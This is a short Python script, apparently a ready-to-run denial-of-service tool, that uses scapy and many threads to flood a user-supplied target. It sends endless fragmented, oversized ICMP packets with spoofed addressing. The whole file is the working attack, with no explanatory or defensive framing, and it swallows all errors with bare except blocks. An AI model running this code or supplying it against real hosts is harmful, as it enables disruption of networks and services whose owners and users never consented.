import threading
from scapy.all import *

try:
	ip = raw_input("Target: ")
	altIP = raw_input("Spoofed IP: ")
	threads = input("Threads: ")

	def icmpflood():
		try:
			while True:
				packet = IP(src=ip, dst=altIP)/ICMP()/("Z" * 65535)
				send(fragment(packet), loop=1, verbose=0)
		except:
			pass

	for i in range(int(threads)):
		thread = threading.Thread(target=icmpflood)
		thread.start()
except:
	pass
